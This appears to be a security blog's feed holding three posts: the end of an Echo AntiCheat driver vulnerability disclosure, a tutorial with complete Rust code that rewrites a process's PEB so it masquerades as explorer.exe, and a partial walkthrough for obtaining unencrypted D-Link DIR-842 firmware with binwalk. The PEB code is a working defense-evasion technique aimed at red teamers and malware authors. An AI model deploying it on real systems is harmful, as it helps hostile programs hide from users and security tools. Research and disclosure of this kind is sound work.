&lt;p&gt;As part of my research, I firstly inform the supplier of software before making a post about it. For this reason I waited roughly two months with writing this blogpost. When I joined Echo AntiCheat&amp;rsquo;s official discord I was directly met with an announcement, see below. Within the announcement Echo Anticheat makes a couple bold statements; The driver is automatically deleted following usage, poses no security risk to the user, considered standard practices at the time, there is no CVE and all vulnerabilities related to this product &lt;code&gt;EchoDrv&lt;/code&gt; are only based on inaccuracies and rumors.&lt;/p&gt;

&lt;img src=&#34;/img/CVE.png&#34;  alt=&#34;cve&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;There is indeed not a CVE for the EchoDrv vulnerability &lt;code&gt;yet&lt;/code&gt;, but that&amp;rsquo;s why we have the Common Vulnerability Scoring System or CVSS for short. CVSS lets you calculate a score from 0-10 on how critical a vulnerability is. The CVSS score for EchoDrv is a &lt;code&gt;8.2&lt;/code&gt; denoted as a high vulnerability (&lt;a href=&#34;https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)&#34;&gt;https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The driver may be deleted automatically with the original usermode anticheat, this is not the case for software abusing this driver to either cheat, privilege escalate, protect processes or incapacitate AV/EDR. This vulnerability does not only pose a &lt;code&gt;severe&lt;/code&gt; risk to the overall security of the systems of users but also those of companies! Just take a look at this article where a ransomware groups abuses a abritrary read/write (just like in EchoDrv) to disable AV/EDR to deploy ransomware: &lt;a href=&#34;https://www.bleepingcomputer.com/news/security/blackbyte-ransomware-abuses-legit-driver-to-disable-security-products/&#34;&gt;https://www.bleepingcomputer.com/news/security/blackbyte-ransomware-abuses-legit-driver-to-disable-security-products/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Anyways, enough ranting here is the complete chat I had with Josh from Echo Anticheat.&lt;/p&gt;

&lt;img src=&#34;/img/josh1.png&#34;  alt=&#34;josh&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;



&lt;img src=&#34;/img/josh2.png&#34;  alt=&#34;josh2&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;After this little chat I met the same faith as the first security researcher, banned from their discord server for trying to disclose a vulnerability.&lt;/p&gt;
&lt;p&gt;Thank you for reading this write up and I want to close this blog post with a qoute which I found to be very fitting for this situation:&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Facts do not cease to exist because they are ignored&amp;rdquo; - Aldous Huxley&lt;/p&gt;
&lt;h1 id=&#34;8-references&#34;&gt;&lt;code&gt;8&lt;/code&gt; References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ioctl.fail/echo-ac-writeup/&#34;&gt;https://ioctl.fail/echo-ac-writeup/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.geeksforgeeks.org/difference-between-user-mode-and-kernel-mode/&#34;&gt;https://www.geeksforgeeks.org/difference-between-user-mode-and-kernel-mode/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/wavestone-cdt/EDRSandblast&#34;&gt;https://github.com/wavestone-cdt/EDRSandblast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.adlice.com/making-an-antivirus-engine-the-guidelines/&#34;&gt;https://www.adlice.com/making-an-antivirus-engine-the-guidelines/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://codemachine.com/articles/kernel_callback_functions.html&#34;&gt;https://codemachine.com/articles/kernel_callback_functions.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid&#34;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle&#34;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148&#34;&gt;https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Masquerading Process Environment Block (PEB) using Rust</title>
      <link>/posts/masqpeb/</link>
      <pubDate>Thu, 20 Jul 2023 00:00:00 +0000</pubDate>
      
      <guid>/posts/masqpeb/</guid>
      <description>1 Why? In the realm of cybersecurity, adversaries often employ masquerading techniques to cloak their programs, making them appear genuine or harmless to both users and security tools. This deceptive strategy is purposefully employed to elude detection and evade defensive measures.
2 What is the Process Environment Block (PEB) The Process Environment Block (PEB) holds essential process information for the current running process. Comprising nineteen entries, it serves as a user-mode representation of the process, possessing the highest-level knowledge in kernel mode and the lowest-level understanding in user mode.</description>
      <content>&lt;h1 id=&#34;1-why&#34;&gt;&lt;code&gt;1&lt;/code&gt; Why?&lt;/h1&gt;
&lt;p&gt;In the realm of cybersecurity, adversaries often employ masquerading techniques to cloak their programs, making them appear genuine or harmless to both users and security tools. This deceptive strategy is purposefully employed to elude detection and evade defensive measures.&lt;/p&gt;
&lt;h1 id=&#34;2-what-is-the-process-environment-block-peb&#34;&gt;&lt;code&gt;2&lt;/code&gt; What is the Process Environment Block (PEB)&lt;/h1&gt;
&lt;p&gt;The Process Environment Block (PEB) holds essential process information for the current running process. Comprising nineteen entries, it serves as a user-mode representation of the process, possessing the highest-level knowledge in kernel mode and the lowest-level understanding in user mode. Within the PEB lies valuable data concerning the running process, such as whether it is being debugged, the loaded modules, and the command line used to initiate the process.&lt;/p&gt;

&lt;img src=&#34;/img/peb-structure.png&#34;  alt=&#34;PEB Structure&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;h1 id=&#34;21-why-is-the-peb-structure-interesting&#34;&gt;&lt;code&gt;2.1&lt;/code&gt; Why is the PEB Structure interesting?&lt;/h1&gt;
&lt;p&gt;The PEB structure holds a significant allure for both malware developers and Red teamers. Its manipulability from userland allows us to obscure crucial information about our process, including the loaded modules, execution path, executable, command line arguments, and even whether our process is under debugging. This makes it a valuable resource for crafting stealthy and evasive techniques.&lt;/p&gt;
&lt;h1 id=&#34;3-what-makes-our-process-different-from-explorerexe&#34;&gt;&lt;code&gt;3&lt;/code&gt; What makes our process different from explorer.exe?&lt;/h1&gt;
&lt;p&gt;To find out what makes our process different to explorer.exe we will have to compare the two. There are four places across two different structures within the PEB that define what kind of process it is, namely:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PEB_LDR_DATA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RTL_USER_PROCESS_PARAMETERS&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;31-peb_ldr_data-and-rtl_user_process_parameters-of-explorerexe&#34;&gt;&lt;code&gt;3.1&lt;/code&gt; PEB_LDR_DATA and RTL_USER_PROCESS_PARAMETERS of explorer.exe&lt;/h1&gt;
&lt;p&gt;I will be using WinDbg (downloaded from the Windows Store) to inspect the PEB structure of the explorer.exe process.&lt;/p&gt;
&lt;p&gt;When loading explorer.exe into WinDbg, we can see the PEB structure using the following command: &lt;code&gt;dt _peb @$peb&lt;/code&gt;

&lt;img src=&#34;/img/peb-explorer.png&#34;  alt=&#34;PEB Structure&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;

&lt;/p&gt;
&lt;p&gt;From the debugger we can see that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_PEB_LDR_DATA&lt;/code&gt; is located at: &lt;code&gt;0x00007ff94471c4c0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RTL_USER_PROCESS_PARAMETERS&lt;/code&gt; is located  at &lt;code&gt;0x00000000006627c0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is however just the start, when inspecting the &lt;code&gt;RTL_USER_PROCESS_PARAMETERS&lt;/code&gt; we can see the &lt;code&gt;ImagePathName&lt;/code&gt; and the &lt;code&gt;CommandLine&lt;/code&gt;:

&lt;img src=&#34;/img/rtl_user_parameters.png&#34;  alt=&#34;rtl_user_process_parameters&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;

&lt;/p&gt;
&lt;p&gt;Now we need to loop through the modules that are held by &lt;code&gt;PEB_LDR_DATA&lt;/code&gt;. The reason for this will become clear in a minute. When doing &lt;code&gt;dt _PEB_LDR_DATA 0x00007ff94471c4c0&lt;/code&gt; we can see a table entry list, the one we&amp;rsquo;re after is called &lt;code&gt;InLoadOrderModuleList&lt;/code&gt;.

&lt;img src=&#34;/img/ldr_table.png&#34;  alt=&#34;ldr_table&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;

&lt;/p&gt;
&lt;p&gt;We take the first entry of the ldr data table and check it&amp;rsquo;s &lt;code&gt;FullDllName&lt;/code&gt; and &lt;code&gt;BaseDllName&lt;/code&gt;, wow look it&amp;rsquo;s &lt;code&gt;explorer.exe&lt;/code&gt;

&lt;img src=&#34;/img/table_ldr_entry.png&#34;  alt=&#34;LDR_DATA&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;

&lt;/p&gt;
&lt;p&gt;Now we know how the explorer.exe process is supposed to look, from a debugger angle. But the question remains, how does the PEB of an other process look? Let&amp;rsquo;s take &lt;code&gt;notepad.exe&lt;/code&gt; as an example.

&lt;img src=&#34;/img/notepad_rtl.png&#34;  alt=&#34;LDR_DATA&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


We can see the following information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ImagePathName&lt;/code&gt; is C:\Windows\notepad.exe&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CommandLine&lt;/code&gt; is C:\Windows\notepad.exe&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FullDllName&lt;/code&gt; is C:\Windows\notepad.exe&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BaseDllName&lt;/code&gt; is notepad.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If we want to successfully masquerade our PEB we will have to overwrite those four variables. But how does this Rust code look? well.. here is the code :P&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;rust&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Masquerade Peb&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-rust&#34; &gt;&lt;code&gt;
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
use ntapi::ntpebteb::PEB;
use ntapi::ntrtl::{RtlEnterCriticalSection, RtlInitUnicodeString, RtlLeaveCriticalSection};
use ntapi::winapi::shared::ntdef::UNICODE_STRING;

use std::arch::asm;
use std::env;

/// Gets a pointer to the Thread Environment Block (TEB)
#[cfg(target_arch = &amp;#34;x86&amp;#34;)]
pub unsafe fn get_teb() -&amp;gt; *mut ntapi::ntpebteb::TEB {
    let teb: *mut ntapi::ntpebteb::TEB;
    asm!(&amp;#34;mov {teb}, fs:[0x18]&amp;#34;, teb = out(reg) teb);
    teb
}

/// Get a pointer to the Thread Environment Block (TEB)
#[cfg(target_arch = &amp;#34;x86_64&amp;#34;)]
pub unsafe fn get_teb() -&amp;gt; *mut ntapi::ntpebteb::TEB {
    let teb: *mut ntapi::ntpebteb::TEB;
    asm!(&amp;#34;mov {teb}, gs:[0x30]&amp;#34;, teb = out(reg) teb);
    teb
}

/// Get a pointer to the Process Environment Block (PEB)
pub unsafe fn get_peb() -&amp;gt; *mut PEB {
    let teb = get_teb();
    let peb = (*teb).ProcessEnvironmentBlock;
    peb
}

// Convert the PWCH to a String
unsafe fn convert_mut_u16_to_string(ptr: *mut u16) -&amp;gt; String {
    if ptr.is_null() {
        return &amp;#34;failed&amp;#34;.to_string();
    }

    let mut len = 0;
    while *ptr.offset(len) != 0 {
        len &amp;#43;= 1;
    }

    let slice = std::slice::from_raw_parts(ptr, len as usize);

    let utf8_bytes: Vec&amp;lt;u8&amp;gt; = slice
        .iter()
        .flat_map(|&amp;amp;c| std::char::from_u32(c as u32).map(|ch| ch.to_string().into_bytes()))
        .flatten()
        .collect();

    match String::from_utf8(utf8_bytes) {
        Ok(s) =&amp;gt; s.to_string(),
        Err(_) =&amp;gt; &amp;#34;failed&amp;#34;.to_string(),
    }
}

// Convert a String to a PWCH
unsafe fn convert_string_to_mut_u16(s: String) -&amp;gt; *mut u16 {
    let utf16_data: Vec&amp;lt;u16&amp;gt; = s.encode_utf16().collect();
    let len = utf16_data.len();
    let ptr =
        std::alloc::alloc(std::alloc::Layout::from_size_align(len * 2, 2).unwrap()) as *mut u16;

    std::ptr::copy_nonoverlapping(utf16_data.as_ptr(), ptr, len);

    *ptr.add(len) = 0;

    ptr
}

fn main() {
    unsafe {
        let peb = get_peb();

        let windows_explorer = convert_string_to_mut_u16(&amp;#34;C:\\Windows\\explorer.exe&amp;#34;.to_string());
        let explorer = convert_string_to_mut_u16(&amp;#34;explorer.exe&amp;#34;.to_string());

        println!(&amp;#34;Masquerading ImagePathName and CommandLine&amp;#34;);

        RtlInitUnicodeString(&amp;amp;mut (*(*peb).ProcessParameters).ImagePathName as *mut UNICODE_STRING, windows_explorer);
        RtlInitUnicodeString(&amp;amp;mut (*(*peb).ProcessParameters).CommandLine as *mut UNICODE_STRING, windows_explorer);

        println!(&amp;#34;Preparing to masquerade FullDllName and BaseDllName&amp;#34;);

        RtlEnterCriticalSection((*peb).FastPebLock);

        let mut module_list = (*(*peb).Ldr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;
        println!(&amp;#34;Traversing all modules&amp;#34;);
        while !(*module_list).DllBase.is_null() {
            let current_exe_path = get_current_exe();
            let utf8_name = convert_mut_u16_to_string((*module_list).FullDllName.Buffer);

            if utf8_name == current_exe_path {
                println!(&amp;#34;Masquerading FullDllName and BaseDllName&amp;#34;);
                RtlInitUnicodeString(&amp;amp;mut (*module_list).FullDllName as *mut UNICODE_STRING, windows_explorer);
                RtlInitUnicodeString(&amp;amp;mut (*module_list).BaseDllName as *mut UNICODE_STRING, explorer);
            }

            module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
        }

        println!(&amp;#34;Masqueraded PEB&amp;#34;);
        RtlLeaveCriticalSection((*peb).FastPebLock);
    }
}

fn get_current_exe() -&amp;gt; String {
    match env::current_exe() {
        Ok(exe_path) =&amp;gt; exe_path.display().to_string(),
        Err(_) =&amp;gt; return &amp;#34;failed&amp;#34;.to_string(),
    }
}

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;When we run this code within our debugger and look at the PEB when it&amp;rsquo;s ran it&amp;rsquo;s course we get the following output:

&lt;img src=&#34;/img/masqueraded.png&#34;  alt=&#34;ldr_table&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


And thus have successfully masqueraded our process&#39; PEB to look exactly like explorer.exe&lt;/p&gt;
&lt;p&gt;The full code is also available here: &lt;a href=&#34;https://github.com/ThottySploity/masqueradepeb-rs&#34;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Masquerading PEB is essential for staying stealthy and evading defenses. As demonstrated, it is not hard to implement and it also was kinda fun to do :)&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://attack.mitre.org/techniques/T1036/&#34;&gt;https://attack.mitre.org/techniques/T1036/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb&#34;&gt;https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm&#34;&gt;https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malwareandstuff.com/peb-where-magic-is-stored/&#34;&gt;https://malwareandstuff.com/peb-where-magic-is-stored/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Obtaining the latest decrypted firmware version for DIR-842</title>
      <link>/posts/dir-842/</link>
      <pubDate>Thu, 20 Jul 2023 00:00:00 +0000</pubDate>
      
      <guid>/posts/dir-842/</guid>
      <description>1 Why DIR-842 and why D-LINK I hold no specific animosity towards, nor particular fascination with, D-LINK products. However, I’ve chosen to explore the firmware of D-LINK as a form of amusement. IoT devices, in general, are often known for their vulnerabilities. My intention is to potentially discover intriguing findings that can expand my knowledge while providing an enjoyable pastime during my free hours.
2 Three common firmware release scenarios There are three common scenarios associated with firmware releases, particularly in the case of routers.</description>
      <content>&lt;h1 id=&#34;1-why-dir-842-and-why-d-link&#34;&gt;&lt;code&gt;1&lt;/code&gt; Why DIR-842 and why D-LINK&lt;/h1&gt;
&lt;p&gt;I hold no specific animosity towards, nor particular fascination with, D-LINK products. However, I’ve chosen to explore the firmware of D-LINK as a form of amusement. IoT devices, in general, are often known for their vulnerabilities. My intention is to potentially discover intriguing findings that can expand my knowledge while providing an enjoyable pastime during my free hours.&lt;/p&gt;
&lt;h1 id=&#34;2-three-common-firmware-release-scenarios&#34;&gt;&lt;code&gt;2&lt;/code&gt; Three common firmware release scenarios&lt;/h1&gt;
&lt;p&gt;There are three common scenarios associated with firmware releases, particularly in the case of routers. When encountering an encrypted firmware, it is highly likely that the firmware’s release cycle falls into one of the following three scenarios.&lt;/p&gt;
&lt;p&gt;Now, let’s discuss the process of decrypting a firmware release. The procedure is straightforward: we revert to a previous firmware release. Essentially, a device needs to flash a valid firmware version in order to operate properly. An encrypted firmware version is considered invalid and would render the device dysfunctional. Therefore, the firmware must be decrypted before it can be flashed onto the device.&lt;/p&gt;
&lt;p&gt;One way to accomplish this is by acquiring the product in question, connecting to its console, and exploring for a firmware decryption program. However, since I am broke, I will be downloading the firmware directly from the vendor.&lt;/p&gt;
&lt;h1 id=&#34;21-scenario-1&#34;&gt;&lt;code&gt;2.1&lt;/code&gt; Scenario 1&lt;/h1&gt;
&lt;p&gt;Initially, when the firmware was initially shipped, it was completely unencrypted. However, as the updates were introduced, a decryption routine was implemented to facilitate future firmware updates. Therefore, all subsequent firmware releases are encrypted.&lt;/p&gt;

&lt;img src=&#34;/img/scenario1.png&#34;  alt=&#34;Scenario 1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;h1 id=&#34;22-scenario-2&#34;&gt;&lt;code&gt;2.2&lt;/code&gt; Scenario 2&lt;/h1&gt;
&lt;p&gt;The device firmware is encrypted in the original release. The vendor however changed the encryption scheme and released an unencrypted transition version.&lt;/p&gt;

&lt;img src=&#34;/img/scenario2.png&#34;  alt=&#34;Scenario 2&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;Similar to scenario 1, we obtain the decryption routine from v1.2 and apply this to v1.3. The release notes usually contain helpful information regarding the version the user has to upgrade to before upgrading to the new firmware.&lt;/p&gt;
&lt;h1 id=&#34;23-scenario-3&#34;&gt;&lt;code&gt;2.3&lt;/code&gt; Scenario 3&lt;/h1&gt;
&lt;p&gt;The device firmware is encrypted in the original release. However the vendor decided to change the encryption scheme in newer firmware versions.&lt;/p&gt;

&lt;img src=&#34;/img/scenario3.png&#34;  alt=&#34;Scenario 3&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;In this scenario, acquiring the decryption routine poses a challenge without a straightforward solution. You have two options available: 1) acquire the device from the vendor and directly extract the unencrypted firmware from the hardware, or 2) engage in further analysis of the firmware, aiming to overcome the encryption and gain access.&lt;/p&gt;
&lt;h1 id=&#34;3-firmware-from-vendor&#34;&gt;&lt;code&gt;3&lt;/code&gt; Firmware from vendor&lt;/h1&gt;
&lt;p&gt;You can find a lot of firmwares just by googling, name of product + firmware. Through this method I found the firmware page for the AC12000 Wireless router. The site offers six different firmware versions and we start at the lowest possible version. We could’ve started at the highest possible version and worked our way down the version ladder, trying to extract everything and stopping at the one which actually extracts. But as highlighted in the previous three possible scenario’s I just start at the bottom and work my way up so I do not miss any important detail.&lt;/p&gt;
&lt;h1 id=&#34;31-reversing-the-vendor-gotten-firmware&#34;&gt;&lt;code&gt;3.1&lt;/code&gt; Reversing the vendor gotten firmware&lt;/h1&gt;
&lt;p&gt;Highlighted in red is the lowest possible firmware that D-LINK has available for DIR-842. We download this and get to reversing.&lt;/p&gt;

&lt;img src=&#34;/img/firmware1.png&#34;  alt=&#34;firmware from vendor&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;h1 id=&#34;311-firmware-v10-300b18&#34;&gt;&lt;code&gt;3.1.1&lt;/code&gt; Firmware v1.0 (3.00B18)&lt;/h1&gt;
&lt;p&gt;I have a VM with binwalk and Ghidra installed. Ghidra is a free and open source reverse engineering tool developed by the NSA, while binwalk is a useful utility for extracting embedded files and executable code from a specified binary image.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;binwalk firmware v1.0&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.00B18$ ls
firmware.bin
user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.00B18$ binwalk -eM firmware.bin 

Scan Time:     2023-06-24 07:39:49
Target File:   /home/user/Desktop/DIR-842/firmware_3.00B18/firmware.bin
MD5 Checksum:  815ab88500a14ea7871356a490b80ca3
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: &amp;#34;dev=/dev/mtdblock/5&amp;#34;
112           0x70            uImage header, header size: 64 bytes, header CRC: 0x6A7785EB, created: 2017-05-19 16:57:27, image size: 1226247 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xCD5C9222, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: &amp;#34;MIPS Seattle Linux-3.3.8&amp;#34;
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3616252 bytes
1245296       0x130070        PackImg section delimiter tag, little endian size: 15765760 bytes; big endian size: 9564160 bytes

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The output of binwalk tells us that the firmware was not encrypted, otherwise it would have outputted nothing or something along the lines of “Encrypted”. The entropy of a file also gives a pointer to if the file has been encrypted or not. I encourage you to google how file entropy works :) Nothing notable has come up from reversing this firmware version and thus I decided to move onto the next firmware version (3.01B05).&lt;/p&gt;
&lt;h1 id=&#34;312-firmware-v11-301b05&#34;&gt;&lt;code&gt;3.1.2&lt;/code&gt; Firmware v1.1 (3.01B05)&lt;/h1&gt;
&lt;p&gt;The way of reversing firmware 3.01B05 takes the same steps as 3.00B18, namely just downloading it from the vendor site and trying to extract it using binwalk -eM.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;binwalk firmware v1.1&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.01B05$ ls
DIR-842C1_FW301b05.bin
user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.01B05$ binwalk -eM DIR-842C1_FW301b05.bin 

Scan Time:     2023-06-24 07:55:46
Target File:   /home/user/Desktop/DIR-842/firmware_3.01B05/DIR-842C1_FW301b05.bin
MD5 Checksum:  cbe17b3fe6d3bdfe8123b215d7db39e5
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: &amp;#34;dev=/dev/mtdblock/5&amp;#34;
112           0x70            uImage header, header size: 64 bytes, header CRC: 0xFB966859, created: 2017-08-16 08:50:01, image size: 1225530 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xC35F7959, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: &amp;#34;MIPS Seattle Linux-3.3.8&amp;#34;
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3616196 bytes

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;As we can see in the output of binwalk, this firmware is also not encrypted and we can extract it and walk through it. However since our goal is to get the most recent version we keep moving forward. No major findings concerning an encryption/decryption scheme have been found in this firmware.&lt;/p&gt;
&lt;h1 id=&#34;313-firmware-v20-310b05&#34;&gt;&lt;code&gt;3.1.3&lt;/code&gt; Firmware v2.0 (3.10B05)&lt;/h1&gt;
&lt;p&gt;One noticeable aspect (which I hope grabs your attention as well) is the version update. We transitioned from versions 3.00 and 3.01 to version 3.10, suggesting the likelihood of significant modifications in this release. Upon downloading this version, we obtain two files: &lt;code&gt;DIR842C1_FW310b05.bin&lt;/code&gt; and &lt;code&gt;DIR842C1_FW302b03_middle.bin&lt;/code&gt;.&lt;/p&gt;

&lt;img src=&#34;/img/firmware_version_change.png&#34;  alt=&#34;firmware version changes&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;Now we see &lt;code&gt;DIR842C1_FW302b03_middle.bin&lt;/code&gt; we can assume that this is the unencrypted firmware version that holds the decryption scheme for all the future firmware versions. All that is left to do is extract the data from this firmware.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;binwalk firmware v2.0&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;

user@user-virtual-machine:~/Desktop/DIR-842/firmware_3.10B05$ binwalk -eM DIR842C1_FW302b03_middle.bin 

Scan Time:     2023-06-24 08:16:57
Target File:   /home/user/Desktop/DIR-842/firmware_3.10B05/DIR842C1_FW302b03_middle.bin
MD5 Checksum:  98868352a4913aee2d2da4acd8e1a04e
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: &amp;#34;dev=/dev/mtdblock/5&amp;#34;
112           0x70            uImage header, header size: 64 bytes, header CRC: 0xA33A0532, created: 2018-07-02 07:26:57, image size: 1234680 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xE2D6A8D0, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: &amp;#34;MIPS Seattle Linux-3.3.8&amp;#34;
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3641936 bytes
1245296       0x130070        PackImg section delimiter tag, little endian size: 11572736 bytes; big endian size: 9875456 bytes
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;If only there was a way to check if this middle firmware is our holy grail… remember those release notes? well thank you D-LINK because they tell you exactly what you need to do. Here is the example of the latest firmware version &lt;code&gt;3.13B05&lt;/code&gt;.&lt;/p&gt;

&lt;img src=&#34;/img/release-notes.png&#34;  alt=&#34;firmware release notes&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


